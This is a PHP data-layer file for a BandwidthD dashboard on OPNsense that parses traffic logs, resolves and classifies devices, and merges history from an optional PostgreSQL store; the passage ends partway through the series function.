<?php
/*
 * bwd_data.inc.php — data layer for the BandwidthD dashboard and cron scripts.
 *
 * Parses bandwidthd's CDF time-series logs and resolves IP -> friendly names
 * from OPNsense sources. Shared by the MVC controllers (web) and the cron scripts.
 * No output here; pure functions.
 *
 * CDF record fields (see bandwidthd.c StoreIPDataInCDF):
 *   0 ip, 1 timestamp,
 *   2-8  SEND (out/upload):     total,icmp,udp,tcp,ftp,http,p2p
 *   9-15 RECEIVE (in/download): total,icmp,udp,tcp,ftp,http,p2p
 *
 * Licensed under the Apache License, Version 2.0.
 */

/* The platform layer binds this data layer to OPNsense: config.xml access, DHCP
 * lease sources, notifications. The off-box test harness pre-defines that same
 * seam with stubs (it has no OPNsense to load), so only pull it in when nothing
 * has provided it already. */
if (!function_exists('bwd_cfg')) {
	require_once(__DIR__ . '/bwd_platform.inc.php');
}
if (!defined('BWD_BASE')) {
	define('BWD_BASE', '/usr/local/bandwidthd');
}

/* Period selector -> bandwidthd CDF "tag" digit. 1=daily 2=weekly 3=monthly 4=yearly */
function bwd_period_tag($p) {
	$p = (int) $p;
	return ($p >= 1 && $p <= 4) ? $p : 1;
}

/* CDF files for a period, oldest->newest (slot 5 is oldest, 0 is current). */
function bwd_cdf_files($period) {
	$tag = bwd_period_tag($period);
	$files = array();
	foreach (array(5, 4, 3, 2, 1, 0) as $slot) {
		$f = BWD_BASE . "/log.{$tag}.{$slot}.cdf";
		if (is_file($f)) {
			$files[] = $f;
		}
	}
	return $files;
}

/* IP -> friendly name. Sources are OPNsense-specific; see bwd_platform.inc.php. */
function bwd_hostmap() {
	return bwd_platform_hostmap();
}

/* Atomically write $contents to $file: write a unique temp file in the SAME
 * directory, then rename() over the target (atomic on one filesystem). A crash or
 * power loss mid-write then can't truncate a durable state file — the reader sees
 * either the old or the new file, never a half-written one. Returns true on
 * success. Used by every rollups/*.json writer (alerts rollup, exporter/probe
 * state, fingerprint + custom-tag sidecars). */
function bwd_atomic_write($file, $contents) {
	/* bwd_json() returns false on invalid UTF-8 (a Latin-1 <title> from a LAN
	 * device is enough); file_put_contents($tmp, false) writes 0 bytes and returns
	 * 0, so the rename would replace the state file with an empty one. */
	if (!is_string($contents)) { return false; }
	$dir = dirname($file);
	if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
	$tmp = @tempnam($dir, '.bwd');
	if ($tmp === false) { return false; }
	if (@file_put_contents($tmp, $contents) === false) { @unlink($tmp); return false; }
	@chmod($tmp, 0644);   // tempnam creates 0600; these are read by both root cron and the www GUI
	if (!@rename($tmp, $file)) { @unlink($tmp); return false; }
	return true;
}

/* bwd_json() for anything that may carry bytes from the LAN (device titles,
 * banners, hostnames): invalid UTF-8 becomes U+FFFD instead of turning the whole
 * document into false. Use this, not bwd_json(), for state files and exports. */
function bwd_json($value, $flags = 0) {
	return json_encode($value, $flags | JSON_INVALID_UTF8_SUBSTITUTE);
}

/* Empty per-host accumulator. */
function bwd_blank_host($ip) {
	return array('ip' => $ip, 'in' => 0.0, 'out' => 0.0,
		'tcp' => 0.0, 'udp' => 0.0, 'http' => 0.0, 'p2p' => 0.0, 'icmp' => 0.0, 'ftp' => 0.0);
}

/* IP -> MAC. MAC is the stable device identity (IP can change via DHCP), used by
 * the rollup/alerts layer. Sources are OPNsense-specific; see bwd_platform.inc.php. */
function bwd_macmap() {
	return bwd_platform_macmap();
}

/* Lazily-loaded, cached OUI -> vendor table from the bundled oui.tsv (offline).
 * Keyed by the 6-hex-uppercase OUI; refreshable via scripts/update-oui.sh. */
function bwd_oui_table() {
	static $tbl = null;
	if ($tbl !== null) { return $tbl; }
	$tbl = array();
	$fh = @fopen(__DIR__ . '/data/oui.tsv', 'r');
	if ($fh) {
		while (($line = fgets($fh)) !== false) {
			$p = explode("\t", rtrim($line, "\r\n"), 2);
			if (count($p) === 2 && $p[0] !== '') { $tbl[$p[0]] = $p[1]; }
		}
		fclose($fh);
	}
	return $tbl;
}

/* Resolve a MAC to vendor info from the bundled OUI table (fully offline).
 * Returns ['mac','oui','vendor','randomized']. Locally-administered / randomized
 * MACs (U/L bit set in the first octet — common on modern phones) have no
 * registered owner and are flagged rather than mis-attributed. */
function bwd_vendor($mac) {
	$mac = strtolower(trim((string) $mac));
	$hex = preg_replace('/[^0-9a-f]/', '', $mac);
	if (strlen($hex) < 6) {
		return array('mac' => $mac, 'oui' => '', 'vendor' => '', 'randomized' => false);
	}
	$first = hexdec(substr($hex, 0, 2));
	$randomized = (bool) ($first & 0x02);
	$oui = strtoupper(substr($hex, 0, 6));
	if ($randomized) {
		return array('mac' => $mac, 'oui' => $oui, 'vendor' => '', 'randomized' => true);
	}
	$tbl = bwd_oui_table();
	return array('mac' => $mac, 'oui' => $oui, 'vendor' => $tbl[$oui] ?? '', 'randomized' => false);
}

/* Map a vendor name to a coarse usage tag via the curated heuristics in
 * data/vendor_tags.php (first match wins). '' when no rule matches. */
function bwd_vendor_tag($vendor) {
	if ($vendor === '' || $vendor === null) { return ''; }
	static $rules = null;
	if ($rules === null) {
		$f = __DIR__ . '/data/vendor_tags.php';
		$rules = is_file($f) ? (array) include $f : array();
	}
	foreach ($rules as $r) {
		if (isset($r[0], $r[1]) && @preg_match($r[0], $vendor)) { return $r[1]; }
	}
	return '';
}

/* Map a device hostname/DNS name to a usage tag via data/hostname_tags.php
 * (first match wins). The hostname is the strongest passive type signal and
 * survives MAC randomization. '' when nothing matches. */
function bwd_hostname_tag($name) {
	$name = trim((string) $name);
	if ($name === '') { return ''; }
	foreach ((array) bwd_hostname_rules() as $r) {
		if (isset($r[0], $r[1]) && @preg_match($r[0], $name)) { return $r[1]; }
	}
	return '';
}

/* Hostname-implied vendor — an optional 3rd element on a data/hostname_tags.php
 * rule (e.g. a "shplug-*" hostname implies Shelly). Lets the displayed vendor be
 * the real brand instead of the OUI silicon maker (Espressif), with no probing.
 * First matching rule that carries a vendor wins. '' when none. */
function bwd_hostname_vendor($name) {
	$name = trim((string) $name);
	if ($name === '') { return ''; }
	foreach ((array) bwd_hostname_rules() as $r) {
		if (isset($r[0], $r[2]) && $r[2] !== '' && @preg_match($r[0], $name)) { return $r[2]; }
	}
	return '';
}

/* Shared loader for data/hostname_tags.php (used by tag + vendor lookups). */
function bwd_hostname_rules() {
	static $rules = null;
	if ($rules === null) {
		$f = __DIR__ . '/data/hostname_tags.php';
		$rules = is_file($f) ? (array) include $f : array();
	}
	return $rules;
}

/* Displayed device vendor with precedence: manual override > active-probe
 * fingerprint > hostname-implied brand > OUI silicon vendor. So a Shelly shows
 * "Shelly", not "Espressif". $name is resolved if null. */
function bwd_display_vendor($mac, $ip = '', $name = null) {
	$v = bwd_device_vendor($mac, $ip);
	if (!empty($v['overridden'])) { return $v['vendor']; }
	if (function_exists('bwd_fp_for')) {
		$pf = bwd_fp_for($mac, $ip);
		// only a reasonably-confident probe overrides the OUI vendor (a weak
		// signal like a generic Widevine cert shouldn't relabel NVIDIA→Google).
		if ($pf && !empty($pf['vendor']) && (float) ($pf['confidence'] ?? 0) >= 0.6) { return $pf['vendor']; }
	}
	if ($name === null) { $name = bwd_name($ip, $mac); }
	$hn = bwd_hostname_vendor($name);
	return $hn !== '' ? $hn : $v['vendor'];
}

/* Vendors whose OUI says little about device type (they ship phones, PCs, TVs,
 * IoT all under one OUI) — their vendor->tag guess is down-weighted so a
 * hostname or subnet signal wins. See #11. */
function bwd_vendor_is_ambiguous($vendor) {
	return (bool) @preg_match('/\b(apple|google|samsung|amazon|microsoft|lg electronics|sony)\b/i', (string) $vendor);
}

/* True if an IPv4 is inside a CIDR (offline, no platform dependency so the data
 * layer stays CLI-testable). Bare IP (no /) matches exactly. */
function bwd_ip_in_cidr($ip, $cidr) {
	$cidr = trim($cidr);
	if (strpos($cidr, '/') === false) { return $ip === $cidr; }
	list($net, $bits) = explode('/', $cidr, 2);
	$bits = (int) $bits;
	$ipL = ip2long($ip); $netL = ip2long($net);
	if ($ipL === false || $netL === false || $bits < 0 || $bits > 32) { return false; }
	if ($bits === 0) { return true; }
	$mask = -1 << (32 - $bits);
	return (($ipL & $mask) === ($netL & $mask));
}

/* User-defined subnet/VLAN -> tag rules from the `classify_subnet_rules`
 * setting (one "CIDR=tag" per line; '#' comments allowed). First match wins.
 * Lets an operator declare e.g. "192.168.30.0/24=iot". '' when none match. */
function bwd_subnet_tag($ip) {
	if (!is_ipaddrv4($ip)) { return ''; }
	static $rules = null;
	if ($rules === null) {
		$rules = array();
		$raw = (string) bwd_cfg('classify_subnet_rules', '');
		foreach (preg_split('/\r?\n/', $raw) as $line) {
			$h = strpos($line, '#');               // strip full-line and inline comments
			if ($h !== false) { $line = substr($line, 0, $h); }
			$line = trim($line);
			if ($line === '' || strpos($line, '=') === false) { continue; }
			list($cidr, $tag) = explode('=', $line, 2);
			$tag = preg_replace('/[^a-z0-9_-]/', '', strtolower(trim($tag)));
			$cidr = trim($cidr);
			if ($cidr !== '' && $tag !== '') { $rules[] = array($cidr, $tag); }
		}
	}
	foreach ($rules as $r) { if (bwd_ip_in_cidr($ip, $r[0])) { return $r[1]; } }
	return '';
}

/* Multi-signal device classifier (#11): fuse weighted signals into a usage tag
 * with a confidence (0..1) and the contributing provenance. A manual per-device
 * override always wins outright. Otherwise candidate tags are scored by summing
 * signal weights, the top-scoring tag wins, and confidence reflects how much of
 * the evidence agreed (a lone weak signal stays low-confidence).
 *
 * Returns ['tag','confidence','signals'=>[['source','tag','weight'],...]].
 * $name/$vendor are resolved if null (kept passable for per-host loops). */
function bwd_classify($mac, $ip = '', $name = null, $vendor = null) {
	// Manual override is ground truth.
	$row = bwd_override_for($mac, $ip);
	if ($row && isset($row['tag']) && $row['tag'] !== '' && $row['tag'] !== 'auto') {
		return array('tag' => $row['tag'], 'confidence' => 1.0,
			'signals' => array(array('source' => 'manual', 'tag' => $row['tag'], 'weight' => 1.0)));
	}
	if ($name === null)   { $name = bwd_name($ip, $mac); }
	if ($vendor === null) { $vendor = bwd_device_vendor($mac, $ip)['vendor']; }

	$signals = array();
	$add = function($source, $tag, $weight) use (&$signals) {
		if ($tag !== '') { $signals[] = array('source' => $source, 'tag' => $tag, 'weight' => $weight); }
	};
	// Active probe (if one is cached): weight scaled by the probe's own
	// confidence, so a strong identity-endpoint hit dominates while a weak
	// server-header guess stays modest. Active evidence > passive signals.
	if (function_exists('bwd_fp_for')) {
		$pf = bwd_fp_for($mac, $ip);
		if ($pf && !empty($pf['tag'])) { $add('fingerprint', $pf['tag'], 0.90 * (float) ($pf['confidence'] ?? 0.7)); }
	}
	$add('subnet',   bwd_subnet_tag($ip), 0.70);    // operator-declared: trusted
	$add('hostname', bwd_hostname_tag($name), 0.60); // best passive type signal
	$vtag = bwd_vendor_tag($vendor);
	$add('vendor',   $vtag, bwd_vendor_is_ambiguous($vendor) ? 0.15 : 0.50);

	if (!$signals) { return array('tag' => '', 'confidence' => 0.0, 'signals' => array()); }

	$score = array(); $total = 0.0;
	foreach ($signals as $s) { $score[$s['tag']] = ($score[$s['tag']] ?? 0) + $s['weight']; $total += $s['weight']; }
	arsort($score);
	$tag = array_key_first($score);
	$win = $score[$tag];
	// Confidence: share of evidence backing the winner, damped so a single weak
	// signal can't read as certainty (K baseline). Manual short-circuits above.
	$confidence = round($win / ($total + 0.40), 2);
	$contrib = array_values(array_filter($signals, function($s) use ($tag) { return $s['tag'] === $tag; }));
	return array('tag' => $tag, 'confidence' => $confidence, 'signals' => $contrib);
}

/* Per-host config overrides (shared by tagging and the alerts engine), keyed by
 * the lowercase match value (MAC or IP). Each row carries whatever fields the
 * settings UI stores (e.g. 'tag', plus alert overrides). On OPNsense these are
 * model-grid rows under OPNsense/Bandwidthd/overrides (see bwd_overrides_rows). */
function bwd_host_overrides() {
	$out = array();
	foreach (bwd_overrides_rows() as $r) {
		if (!is_array($r)) { continue; }
		$m = strtolower(trim($r['match'] ?? ''));
		if ($m !== '') { $out[$m] = $r; }
	}
	return $out;
}

/* True when an override row sets nothing beyond its match key, so it can be
 * dropped to keep config tidy (used by the dashboard set_override endpoint). */
function bwd_override_is_noop($row) {
	if (!is_array($row)) { return true; }
	$g = function($k) use ($row) { return trim((string) ($row[$k] ?? '')); };
	$tag = strtolower($g('tag'));
	return $g('name') === '' && $g('label') === '' && $g('vendor') === '' &&
		($tag === '' || $tag === 'auto') &&
		$g('quota_host_gb') === '' &&
		($row['alerts_enable'] ?? 'inherit') === 'inherit' &&
		($row['anomaly_enable'] ?? 'inherit') === 'inherit' &&
		($row['exfil_enable'] ?? 'inherit') === 'inherit' &&
		($row['newdevice_enable'] ?? 'inherit') === 'inherit';
}

/* The per-device override row for a device, MAC preferred over IP, or null. */
function bwd_override_for($mac, $ip = '') {
	$ov = bwd_host_overrides();
	foreach (array(strtolower(trim((string) $mac)), strtolower(trim((string) $ip))) as $k) {
		if ($k !== '' && isset($ov[$k])) { return $ov[$k]; }
	}
	return null;
}

/* Resolve a device's display name: a manual per-device override (the row's
 * 'name', or legacy 'label') wins over the auto-resolved name. $resolved is the
 * DHCP/DNS name the caller already looked up (bwd_hostmap() is consulted only
 * when $resolved is null, to stay cheap inside per-host loops). */
function bwd_name($ip, $mac = '', $resolved = null) {
	$row = bwd_override_for($mac, $ip);
	if ($row) {
		$n = trim((string) ($row['name'] ?? $row['label'] ?? ''));
		if ($n !== '') { return $n; }
	}
	if ($resolved !== null) { return $resolved; }
	$names = bwd_hostmap();
	return $names[$ip] ?? '';
}

/* Override-aware vendor: a manual per-device vendor wins over the OUI lookup.
 * Returns bwd_vendor()'s shape plus 'overridden' (bool). Pass $ip so an IP-keyed
 * override is honored when the MAC is unknown (e.g. randomized MACs). */
function bwd_device_vendor($mac, $ip = '') {
	$v = bwd_vendor($mac);
	$row = bwd_override_for($mac, $ip);
	$cv = $row ? trim((string) ($row['vendor'] ?? '')) : '';
	$v['overridden'] = ($cv !== '');
	if ($cv !== '') { $v['vendor'] = $cv; }
	return $v;
}

/* Resolve a device's usage tag via the multi-signal classifier (manual override
 * wins, else fused hostname/subnet/vendor signals). Pass $vendor to avoid a
 * second OUI lookup; $name avoids a hostmap lookup in per-host loops. */
function bwd_tag($mac, $ip = '', $vendor = null, $name = null) {
	return bwd_classify($mac, $ip, $name, $vendor)['tag'];
}

/* ---- custom tags (#) --------------------------------------------------------
 * Free-form, multi-valued user labels, ADDITIVE to and independent of the
 * single auto-classified type tag (bwd_tag): the classifier, alerts, overview,
 * API and widget keep using `tag`; custom tags are a dashboard display/filter
 * layer the operator manages (add per-device, plus a rename/delete editor).
 * Stored in rollups/custom_tags.json keyed by lowercase MAC (or IP fallback) —
 * NOT in the override row: pkg_edit caps a rowhelper at 9 columns (no room for
 * a tags column) and wipes any row key it has no column for on every save. */

/* Parse a comma/space-separated value into a sanitized, deduped tag-slug list. */
function bwd_parse_tags($raw) {
	$out = array();
	foreach (preg_split('/[,\s]+/', strtolower((string) $raw)) as $t) {
		$t = preg_replace('/[^a-z0-9_-]/', '', $t);
		if ($t !== '' && !in_array($t, $out, true)) { $out[] = $t; }
	}
	return $out;
}

/* The custom-tags map: lowercase MAC-or-IP key => array of tag slugs.
 * Static-cached for the per-host loops; pass $set to refresh after a write. */
function bwd_custom_tags_map($set = null) {
	static $m = null;
	if ($set !== null) { $m = $set; }
	if ($m === null) {
		$f = BWD_BASE . '/rollups/custom_tags.json';
		$m = is_file($f) ? (json_decode(@file_get_contents($f), true) ?: array()) : array();
	}
	return $m;
}

/* Persist the map (empty entries dropped) and refresh the read cache. Returns true
 * on success; on a write failure the read cache is NOT refreshed, so the request
 * reflects what's actually on disk rather than silently "succeeding". */
function bwd_custom_tags_save($map) {
	$map = array_filter($map);
	if (!bwd_atomic_write(BWD_BASE . '/rollups/custom_tags.json', bwd_json((object) $map))) {
		return false;
	}
	bwd_custom_tags_map($map);
	return true;
}

/* A device's custom tags (MAC key preferred over IP). */
function bwd_custom_tags($mac, $ip = '') {
	$m = bwd_custom_tags_map();
	foreach (array(strtolower(trim((string) $mac)), strtolower(trim((string) $ip))) as $k) {
		if ($k !== '' && isset($m[$k])) { return array_values((array) $m[$k]); }
	}
	return array();
}

/* Every custom tag assigned to any device -> [tag => device_count], tag-sorted. */
function bwd_all_custom_tags() {
	$counts = array();
	foreach (bwd_custom_tags_map() as $tags) {
		foreach ((array) $tags as $t) { $counts[$t] = ($counts[$t] ?? 0) + 1; }
	}
	ksort($counts);
	return $counts;
}

/* True when a consolidated bwd_hosts() row carries any of $tags — matching the
 * dashboard tag bar's semantics (auto type tag + custom tags, unioned). */
function bwd_host_has_tag($h, $tags) {
	if (($h['tag'] ?? '') !== '' && in_array($h['tag'], $tags, true)) { return true; }
	foreach ((array) ($h['tags'] ?? array()) as $t) {
		if (in_array($t, $tags, true)) { return true; }
	}
	return false;
}

/* Resolve a tag selection to the matching devices over a window: the union of
 * their IPs (for CDF row matching) and their DB identity keys (the MAC, or the
 * bare IP when no MAC is known — the usage/daily `mac` column's fallback). With
 * the dashboard tag filter active, series/percentile/daily/overview use this to
 * present "tag total" aggregates instead of the interface total. Memoized per
 * request (the resolution costs a bwd_hosts() pass). */
function bwd_tag_scope($tags, $period, $from = 0, $to = 0) {
	static $cache = array();
	$tags = array_values((array) $tags);
	sort($tags);
	$ck = implode(',', $tags) . "|$period|$from|$to";
	if (isset($cache[$ck])) { return $cache[$ck]; }
	$ips = array(); $keys = array();
	foreach (bwd_hosts($period, $from, $to)['hosts'] as $h) {
		if (!bwd_host_has_tag($h, $tags)) { continue; }
		foreach (($h['ips'] ?? array($h['ip'])) as $i) { $ips[$i] = true; }
		$keys[] = ($h['mac'] !== '') ? $h['mac'] : $h['ip'];
	}
	return $cache[$ck] = array('ips' => $ips, 'keys' => $keys);
}

/* ---- optional PostgreSQL history backend (hybrid read) ---------------------
 * When the external DB is enabled and has data, history comes from it (samples
 * with ts <= watermark) and the live tail from the local CDF (ts > watermark) —
 * disjoint ranges, summed, so graphs show full history with no double-counting.
 * Without the DB everything falls back to CDF-only (unchanged behavior). */
if (is_file(__DIR__ . '/bwd_db.inc.php')) { require_once(__DIR__ . '/bwd_db.inc.php'); }
/* Device fingerprint engine (#11): HTTP/mDNS/SSDP/nmap/DHCP/banner. Feeds
 * bwd_classify a high-weight `fingerprint` signal from its cache when present. */
if (is_file(__DIR__ . '/bwd_fingerprint.inc.php')) { require_once(__DIR__ . '/bwd_fingerprint.inc.php'); }

/* Hybrid engages only with a reachable DB that has data. $GLOBALS['bwd_no_db']
 * forces CDF-only (used by parity tests). */
function bwd_use_db() {
	if (!empty($GLOBALS['bwd_no_db'])) { return false; }
	return function_exists('bwd_db') && bwd_db() && bwd_db_watermark() > 0;
}
/* period -> default window (seconds) when no explicit from/to is given. */
function bwd_default_window($period) {
	switch ((int) $period) {
		case 2: return 604800;     // weekly
		case 3: return 2592000;    // monthly (~30d)
		case 4: return 31536000;   // yearly (~365d)
		default: return 86400;     // daily
	}
}
/* Chart bucket size (seconds) for a window, ~$target points. */
function bwd_bucket_for($span, $target = 300) {
	return (int) max(60, round(max(1, $span) / max(1, $target)));
}

/* Accumulate per-IP CDF samples into $hosts (ip=>blank_host) and $total for the
 * period files, restricted to ts in (minExcl, +inf) ∩ [from,to]. minExcl lets
 * the hybrid path take only the live tail (ts > watermark). Returns [min_t,max_t]. */
function bwd_cdf_accumulate(&$hosts, &$total, $period, $from, $to, $minExcl = 0) {
	$min_t = 0; $max_t = 0;
	foreach (bwd_cdf_files($period) as $file) {
		$fh = @fopen($file, 'r');
		if (!$fh) { continue; }
		while (($line = fgets($fh)) !== false) {
			$f = explode(',', trim($line));
			if (count($f) < 16) { continue; }
			$ip = $f[0];
			if (!is_ipaddrv4($ip)) { continue; }
			$ts = (int) $f[1];
			if ($minExcl && $ts <= $minExcl) { continue; }
			if ($from && $ts < $from) { continue; }
			if ($to && $ts > $to) { continue; }
			if (!$min_t || $ts < $min_t) { $min_t = $ts; }
			if ($ts > $max_t) { $max_t = $ts; }
			if ($ip === '0.0.0.0') { $h = &$total; }
			else { if (!isset($hosts[$ip])) { $hosts[$ip] = bwd_blank_host($ip); } $h = &$hosts[$ip]; }
			$h['out'] += (float) $f[2];
			$h['in']  += (float) $f[9];
			$h['icmp'] += (float)$f[3] + (float)$f[10];
			$h['udp']  += (float)$f[4] + (float)$f[11];
			$h['tcp']  += (float)$f[5] + (float)$f[12];
			$h['ftp']  += (float)$f[6] + (float)$f[13];
			$h['http'] += (float)$f[7] + (float)$f[14];
			$h['p2p']  += (float)$f[8] + (float)$f[15];
			unset($h);
		}
		fclose($fh);
	}
	return array($min_t, $max_t);
}

/* Accumulate per-IP DB history (fine bwd_usage + older bwd_daily) and iface
 * totals into $hosts/$total for ts in [from,to]. Returns the DB's earliest ts. */
function bwd_db_accumulate(&$hosts, &$total, $from, $to) {
	if ($to < $from) { return 0; }
	$p = BWD_DB_PREFIX;
	$r = bwd_db_exec("SELECT ip, sum(in_bytes) i, sum(out_bytes) o,
		sum(coalesce(tcp,0)) tcp, sum(coalesce(udp,0)) udp, sum(coalesce(http,0)) http,
		sum(coalesce(p2p,0)) p2p, sum(coalesce(icmp,0)) icmp, sum(coalesce(ftp,0)) ftp
		FROM {$p}usage WHERE ts >= $1 AND ts <= $2 GROUP BY ip", array($from, $to));
	if ($r) {
		while ($row = pg_fetch_assoc($r)) {
			$ip = $row['ip'];
			if (!isset($hosts[$ip])) { $hosts[$ip] = bwd_blank_host($ip); }
			$h = &$hosts[$ip];
			$h['in'] += (float)$row['i']; $h['out'] += (float)$row['o'];
			$h['tcp'] += (float)$row['tcp']; $h['udp'] += (float)$row['udp'];
			$h['http'] += (float)$row['http']; $h['p2p'] += (float)$row['p2p'];
			$h['icmp'] += (float)$row['icmp']; $h['ftp'] += (float)$row['ftp'];
			unset($h);
		}
	}
	$r2 = bwd_db_exec("SELECT coalesce(sum(in_bytes),0) i, coalesce(sum(out_bytes),0) o
		FROM {$p}iface WHERE ts >= $1 AND ts <= $2", array($from, $to));
	if ($r2 && ($x = pg_fetch_assoc($r2))) { $total['in'] += (float)$x['i']; $total['out'] += (float)$x['o']; }

	// Days ENTIRELY before fine data begins fall back to the coarse daily table.
	// The seam = the local day fine data starts; days < seam come from bwd_daily,
	// the seam day itself is covered by usage above (never both tiers). When there
	// is NO fine data at all, the daily tier owns the whole window. Day bounds use
	// ISO-string compare (YYYY-MM-DD sorts lexically) and DST-safe -1 day math.
	$rf = bwd_db_exec("SELECT coalesce(min(ts),0) m FROM {$p}usage");
	$fineMin = ($rf && ($xf = pg_fetch_row($rf))) ? (int) $xf[0] : 0;
	$upperDay = $fineMin
		? date('Y-m-d', strtotime(date('Y-m-d', $fineMin) . ' -1 day'))   // day before the seam
		: date('Y-m-d', $to);                                            // no fine data: all days
	/* ...but never past the window. Without this a fully historical window reads
	 * every day from its start up to the seam: with a 30-day fine retention, asking
	 * for one week last June summed ~8 weeks into every host and the interface
	 * total. bwd_series and bwd_daily_breakdown both clamp here; this reader was
	 * the outlier, which showed up as the cards disagreeing with the chart. */
	$toDayCap = date('Y-m-d', $to);
	if (strcmp($upperDay, $toDayCap) > 0) { $upperDay = $toDayCap; }
	$lowerDay = date('Y-m-d', $from);
	if (strcmp($lowerDay, $upperDay) <= 0) {
		$rd = bwd_db_exec("SELECT ip, sum(in_bytes) i, sum(out_bytes) o FROM {$p}daily
			WHERE day >= $1 AND day <= $2 GROUP BY ip", array($lowerDay, $upperDay));
		if ($rd) {
			while ($row = pg_fetch_assoc($rd)) {
				$ip = $row['ip'];
				if ($ip === '0.0.0.0') {   // interface sentinel -> total, never a host row
					$total['in'] += (float)$row['i']; $total['out'] += (float)$row['o'];
					continue;
				}
				if (!isset($hosts[$ip])) { $hosts[$ip] = bwd_blank_host($ip); }
				$h = &$hosts[$ip]; $h['in'] += (float)$row['i']; $h['out'] += (float)$row['o']; unset($h);
			}
		}
	}
	$dmin = $fineMin;
	$rdm = bwd_db_exec("SELECT coalesce(min(day)::text,'') d FROM {$p}daily");
	if ($rdm && ($xd = pg_fetch_row($rdm)) && $xd[0] !== '') {
		$dayMin = strtotime($xd[0] . ' 00:00:00');
		if ($dayMin && (!$dmin || $dayMin < $dmin)) { $dmin = $dayMin; }
	}
	return $dmin;
}

/* Collapse per-IP host rows that share the same MAC into one device row, summing
 * traffic across the device's IPs (a device that changed IP via a DHCP lease
 * renewal becomes a single row). The representative 'ip' is the device's
 * highest-traffic IP; 'ips' lists all of them (highest-traffic first). Rows with
 * no MAC are left per-IP — an IP is not a stable identity, and two distinct
 * devices that reused an IP must not merge. Identity (name/vendor/tag) is the
 * same across a MAC's rows, so the representative's is kept. */
function bwd_consolidate_by_mac($list) {
	$groups = array(); $singles = array();
	foreach ($list as $h) {
		if (($h['mac'] ?? '') === '') { $singles[] = $h; continue; }
		$groups[$h['mac']][] = $h;
	}
	$merged = array();
	$sum = array('in', 'out', 'tcp', 'udp', 'http', 'p2p', 'icmp', 'ftp');
	foreach ($groups as $mac => $rows) {
		usort($rows, function($a, $b) { return $b['total'] <=> $a['total']; });
		$rep = $rows[0];
		$rep['ips'] = array();
		foreach ($rows as $r) { $rep['ips'][] = $r['ip']; }
		for ($i = 1; $i < count($rows); $i++) {
			foreach ($sum as $k) { $rep[$k] += $rows[$i][$k]; }
		}
		$rep['total'] = $rep['in'] + $rep['out'];
		$merged[] = $rep;
	}
	return array_merge($merged, $singles);
}

/* All IPv4 addresses currently or historically associated with a MAC — the
 * live ARP/DHCP map plus the DB's recorded IPs — so per-device series/percentile
 * can union a device's lease-renewal IPs. */
function bwd_ips_for_mac($mac) {
	$mac = strtolower(trim((string) $mac));
	$ips = array();
	foreach (bwd_macmap() as $ip => $m) { if ($m === $mac) { $ips[$ip] = true; } }
	if (bwd_use_db()) {
		$r = bwd_db_exec('SELECT DISTINCT ip FROM ' . BWD_DB_PREFIX . 'usage WHERE mac = $1', array($mac));
		if ($r) { while ($x = pg_fetch_row($r)) { if (is_ipaddrv4($x[0])) { $ips[$x[0]] = true; } } }
	}
	return array_keys($ips);
}

/* Aggregate per-IP totals for a period, optionally restricted to [$from,$to]
 * (unix seconds; 0 = unbounded). bandwidthd's 0.0.0.0 row is the interface total
 * and is returned separately as total_host (not in the per-host list). Also
 * reports the min/max timestamp seen so the UI can bound its date pickers. */
function bwd_hosts($period, $from = 0, $to = 0) {
	$hosts = array();
	$total = bwd_blank_host('0.0.0.0');
	$min_t = 0; $max_t = 0;

	if (bwd_use_db()) {
		// DB owns ts <= watermark; the local CDF tail owns ts > watermark.
		$W = bwd_db_watermark();
		$to2 = $to ?: time();
		$from2 = $from ?: ($to2 - bwd_default_window($period));
		$dbMin = bwd_db_accumulate($hosts, $total, $from2, min($to2, $W));
		list($cmin, $cmax) = bwd_cdf_accumulate($hosts, $total, 1, $from2, $to2, $W);
		$min_t = $dbMin ?: $cmin;
		if ($cmin && $cmin < $min_t) { $min_t = $cmin; }
		$max_t = max($cmax, $W);
	} else {
		list($min_t, $max_t) = bwd_cdf_accumulate($hosts, $total, $period, $from, $to, 0);
	}

	$names = bwd_hostmap();
	$macs  = bwd_macmap();
	$list = array();
	foreach ($hosts as $ip => $h) {
		$h['mac']   = $macs[$ip] ?? '';
		$h['name']  = bwd_name($ip, $h['mac'], $names[$ip] ?? '');
		$v = bwd_device_vendor($h['mac'], $ip);
		$h['vendor']     = bwd_display_vendor($h['mac'], $ip, $h['name']);
		$h['oui_vendor'] = $v['vendor'];
		$h['randomized'] = $v['randomized'];
		$cls = bwd_classify($h['mac'], $ip, $h['name'], $v['vendor']);
		$h['tag']            = $cls['tag'];
		$h['tag_confidence'] = $cls['confidence'];
		$h['tag_signals']    = $cls['signals'];
		$h['tags']           = bwd_custom_tags($h['mac'], $ip);  // free-form user labels
		$h['model'] = '';
		if (function_exists('bwd_fp_for')) {
			$pf = bwd_fp_for($h['mac'], $ip);
			if ($pf && (!empty($pf['vendor']) || !empty($pf['model']))) {
				$h['model'] = $pf['model'] ?? '';
				$h['probe'] = array('vendor' => $pf['vendor'], 'model' => $pf['model'],
					'os' => $pf['os'] ?? '', 'via' => $pf['via'], 'ts' => $pf['ts'] ?? 0);
			}
		}
		$h['total'] = $h['in'] + $h['out'];
		$h['ips'] = array($ip);
		$list[] = $h;
	}
	$list = bwd_consolidate_by_mac($list);
	usort($list, function($a, $b) { return $b['total'] <=> $a['total']; });

	// Fall back to summing hosts if bandwidthd didn't emit a 0.0.0.0 row.
	if ($total['in'] == 0 && $total['out'] == 0) {
		foreach ($list as $h) {
			foreach (array('in', 'out', 'tcp', 'udp', 'http', 'p2p', 'icmp', 'ftp') as $k) {
				$total[$k] += $h[$k];
			}
		}
	}
	$total['name'] = gettext('Interface Total');
	$total['total'] = $total['in'] + $total['out'];
	$total['is_total'] = true;

	return array('period' => bwd_period_tag($period), 'generated' => time(),
		'from' => $from, 'to' => $to, 'min_t' => $min_t, 'max_t' => $max_t,
		'total_in' => $total['in'], 'total_out' => $total['out'],
		'total_host' => $total, 'hosts' => $list);
}

/* Time-series for a single IP (use 0.0.0.0 for the interface total) or, when
 * given a MAC, for the whole device — unioning every IP it used (lease renewals).
 * Optionally restricted to [$from,$to] (unix seconds; 0 = unbounded). With $tags
 * non-empty, the 0.0.0.0 id means the TAG selection's total instead of the
 * interface: the union of every device carrying any selected tag. */
function bwd_series($id, $period, $from = 0, $to = 0, $tags = array(), $includeDaily = true) {
	$isMac = (bool) preg_match('/^[0-9a-f]{2}(:[0-9a-f]{2}){5}$/i', trim((string) $id));
	$isTagScope = ($tags && trim((string) $id) === '0.0.0.0');
	if (!$isMac && !is_ipaddrv4($id)) {
		return array('ip' => $id, 'points' => array());
	}
	$names = bwd_hostmap();
	$keys = array();                          // DB identity keys (mac, or ip fallback)
